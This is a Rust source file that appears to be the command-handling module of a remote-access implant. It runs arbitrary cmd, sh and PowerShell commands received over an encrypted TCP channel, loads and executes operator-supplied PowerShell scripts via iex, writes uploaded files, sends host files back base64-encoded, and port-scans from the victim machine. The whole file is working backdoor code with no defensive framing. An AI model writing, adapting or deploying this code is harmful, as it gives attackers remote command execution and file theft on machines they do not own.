use async_port_scanner::Scanner;
use async_std::task;
use base64::{engine::general_purpose, Engine as _};
use regex::Regex;
use simple_crypt::{decrypt, encrypt};
#[allow(deprecated)]
use std::{
    collections::HashMap,
    error::Error,
    fs::File,
    io::{BufReader, Read, Write},
    net::{SocketAddr, TcpStream},
    time::Duration,
    u8,
};

pub struct ImportedScript {
    content: String,
    function_names: Vec<String>,
}

pub fn handle_import_psh(
    stream: &mut TcpStream,
    _command: &str,
    imported_scripts: &mut HashMap<String, ImportedScript>,
    shared_secret: &[u8; 32]
) -> Result<(), Box<dyn Error>> {
    let mut buffer = [0; 65535];
    let mut encoded_data = String::new();

    stream.set_read_timeout(Some(Duration::from_secs(60)))?;

    loop {
        let _ = stream.read(&mut buffer)?;
        let data = String::from_utf8(decrypt(&buffer, shared_secret)?)?;
        encoded_data.push_str(&data);
        if data.contains("|!!done!!|") {
            break;
        }
    }
    encoded_data = encoded_data
        .replace("\r", "")
        .replace("\n", "")
        .replace(" |!!done!!|", "");

    let decoded_data = general_purpose::STANDARD.decode(&encoded_data)?;
    let script_content = String::from_utf8(decoded_data)?;

    let mut function_names = Vec::new();
    let function_pattern = Regex::new(r"function\s+([\w-]+)\s*\{").unwrap();

    for cap in function_pattern.captures_iter(&script_content) {
        if let Some(name) = cap.get(1) {
            function_names.push(name.as_str().to_string());
        }
    }

    let imported_script = ImportedScript {
        content: script_content.clone(),
        function_names: function_names.clone(),
    };

    imported_scripts.insert(script_content, imported_script);

    for function_name in function_names {
        let success_msg = format!("Successfully imported {}\n", function_name);
        let encrypted_data = encrypt(success_msg.as_bytes(), shared_secret)?;
        stream.write(&encrypted_data)?;
    }
    stream.flush()?;

    Ok(())
}

pub fn handle_run_script(
    stream: &mut TcpStream,
    command: &str,
    imported_scripts: &HashMap<String, ImportedScript>,
    shared_secret: &[u8; 32]
) {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    let function_name = parts[1].trim();
    let additional_args = if parts.len() > 2 { parts[2].trim() } else { "" };
    let script_content = imported_scripts
        .values()
        .find(|script| script.function_names.contains(&function_name.to_string()))
        .map(|script| script.content.clone());

    if let Some(script_content) = script_content {
        let command = format!(
            "iex '{}' ; {} {}",
            script_content, function_name, additional_args
        );
        println!("{}", command);
        let output = match std::process::Command::new("powershell")
            .arg("-Command")
            .arg(&command)
            .output()
        {
            Ok(output) => output,
            Err(e) => {
                let error_message = format!("Error executing PowerShell command: {}||cmd||", e);
                let encrypted_data =
                    encrypt(error_message.as_bytes(), shared_secret).expect("Failed to encrypt");
                stream
                    .write(&encrypted_data)
                    .expect("Error writing to stream");
                stream.flush().expect("Error flushing stream");
                return;
            }
        };
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let combined_output = format!("{}\r\n{}\r\n||cmd||", stdout, stderr);
        let encrypted_data =
            encrypt(combined_output.as_bytes(), shared_secret).expect("Failed to encrypt");
        stream
            .write(&encrypted_data)
            .expect("Error writing to stream");
        stream.flush().expect("Error flushing stream");
    } else {
        let mut available_functions = Vec::new();
        for script in imported_scripts.values() {
            for function_name in &script.function_names {
                available_functions.push(function_name);
            }
        }

        let available_functions_str = available_functions
            .iter()
            .map(|name| name.as_str())
            .collect::<Vec<&str>>()
            .join(", ");

        let error_message = format!(
            "Function not found in imported scripts.\r\nAvailable functions: \r\n  {}||cmd||",
            available_functions_str
        );
        let encrypted_data =
            encrypt(error_message.as_bytes(), shared_secret).expect("Failed to encrypt");
        stream
            .write(&encrypted_data)
            .expect("Error writing to stream");
        stream.flush().expect("Error flushing stream");
    }
}

pub fn handle_upload(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) -> Result<(), Box<dyn Error>> {
    let parts: Vec<&str> = command.split(" ").collect();
    let destination = parts[1];
    let mut file = File::create(destination)?;
    // stream.set_read_timeout(Some(Duration::from_secs(60)))?;
    let mut buffer = [0; 1024];
    let mut encoded_data = String::new();
    loop {
        let _ = stream.read(&mut buffer)?;
        let data = String::from_utf8(decrypt(&buffer, shared_secret)?)?;
        encoded_data.push_str(&data);
        if data.contains("|!!done!!|") {
            break;
        }
    }
    encoded_data = encoded_data
        .replace("\r", "")
        .replace("\n", "")
        .replace(" |!!done!!|", "");
    let decoded_data = general_purpose::STANDARD.decode(&encoded_data)?;
    file.write_all(&decoded_data)?;
    let response_string = format!("UPLOAD: File saved to {}.", destination);
    let encrypted_data = encrypt(response_string.as_bytes(), shared_secret)?;
    stream.write(&encrypted_data)?;
    Ok(())
}

pub fn handle_download(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) {
    let parts: Vec<&str> = command.split(" ").collect();
    let file_name = parts[1];
    let file = match File::open(file_name) {
        Ok(file) => file,
        Err(_) => {
            let encrypted_msg =
                encrypt(b"File not found", shared_secret).expect("Failed to encrypt");
            stream
                .write(&encrypted_msg)
                .expect("Error writing to stream");
            return;
        }
    };
    let mut reader = BufReader::new(file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer).expect( "Error reading from file");
    let encodedfile = general_purpose::STANDARD.encode(&buffer);
    let encodedfile = encodedfile.trim();
    let encodedfile = encodedfile.replace("\r", "").replace("\n", "").replace(" ", "");
    let combined_output = format!("{} |!!done!!|", encodedfile);
    
    for chunk in combined_output.as_bytes().chunks(956) {
        let encrypted_data = encrypt(chunk, shared_secret).expect("Failed to encrypt");
        stream.write(&encrypted_data).expect("Error writing to stream");
    }
    stream.flush().unwrap();
}

pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String, shared_secret: &[u8; 32]) {
    let parts: Vec<&str> = command.splitn(2, "||CMDEXEC|| ").collect();
    let command = parts[1];
    let output: std::process::Output;
    if os == "Windows" {
        output = std::process::Command::new("cmd")
            .arg("/c")
            .arg(&command)
            .output()
            .unwrap();
    } else {
        output = std::process::Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output()
            .unwrap();
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined_output = format!("{}{}||cmd||\r\n", stdout, stderr);

    let encrypted_data =
        encrypt(combined_output.as_bytes(), shared_secret).expect("Failed to encrypt");
    stream
        .write(&encrypted_data)
        .expect("Error writing to stream");
    stream.flush().expect("Error flushing stream");
}

pub fn handle_psh(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) {
    let parts: Vec<&str> = command.splitn(2, "||PSHEXEC|| ").collect();
    let command = parts[1];
    let output = std::process::Command::new("powershell")
        .arg("-Command")
        .arg(command)
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined_output = format!("{}{}||cmd||\r\n", stdout, stderr);

    let encrypted_data =
        encrypt(combined_output.as_bytes(), shared_secret).expect("Failed to encrypt");
    stream
        .write(&encrypted_data)
        .expect("Error writing to stream");
    stream.flush().expect("Error flushing stream");
}

pub fn handle_portscan(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) {
    let parts: Vec<&str> = command.split(" ").collect();
    let ip = parts[1];
    let num1_str = parts[2].trim();
    let num1 = match num1_str.parse() {
        Ok(num) => num,
        Err(err) => {
            let err = encrypt(
                format!("Error parsing number: {}", err).as_bytes(),
                shared_secret,
            )
            .expect("Failed to encrypt");
            stream.write(&err).expect("Error writing to stream");
            return;
        }
    };
    let num2_str = parts[3].trim();
    let num2 = match num2_str.parse() {
        Ok(num) => num,
        Err(err) => {
            let err = encrypt(
                format!("Error parsing number: {}", err).as_bytes(),
                shared_secret,
            )
            .expect("Failed to encrypt");
            stream.write(&err).expect("Error writing to stream");
            return;
        }
    };
    let ps = Scanner::new(Duration::from_secs(4));
    let ftr = ps.run(ip.to_string(), num1, num2);
    let my_addrs: Vec<SocketAddr> = task::block_on(async { ftr.await });
    let my_addrs_slice: &[u8] = &my_addrs
        .into_iter()
        .map(|addr| addr.to_string().as_bytes().to_owned())
        .collect::<Vec<Vec<u8>>>()
        .concat();
    let encrypted_data = encrypt(my_addrs_slice, shared_secret).expect("Failed to encrypt");
    stream
        .write(&encrypted_data)
        .expect("Error writing to stream");
}
